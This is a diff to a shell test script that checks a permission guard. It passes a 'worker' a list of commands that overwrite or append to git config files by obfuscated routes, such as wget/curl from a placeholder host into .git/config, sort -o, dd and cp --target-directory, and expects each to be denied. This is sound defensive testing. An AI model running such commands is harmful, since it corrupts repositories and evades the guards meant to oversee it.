@@ -151,7 +151,8 @@ for cmd in "printf x >> \".git\"/config && git push origin $B" "printf x >> .gi'
   "sed -n '1w .git/config' /tmp/p && git push origin $B" "wget -qO.git/config http://x/c && git push origin $B" \
   "awk 'BEGIN{print \"x\" >> \".git/config\"}'; git push origin $B" "tar -xC.git -f /tmp/p.tar; git push origin $B" \
   "curl -4so.git/config https://x/cfg && git push origin $B" "sort -ogitconfig x; git push origin $B" \
-  "sort -qogit/config x; git push origin $B"; do
+  "sort -qogit/config x; git push origin $B" "sort --output=gitconfig x; git push origin $B" \
+  "dd if=x of=git/config; git push origin $B" "cp a --target-directory=.config/git; git push origin $B"; do
   pg worker "$cmd"
   expect deny "[worker] $cmd (a quoted, folded, globbed or expanded git state path) denies"
 done
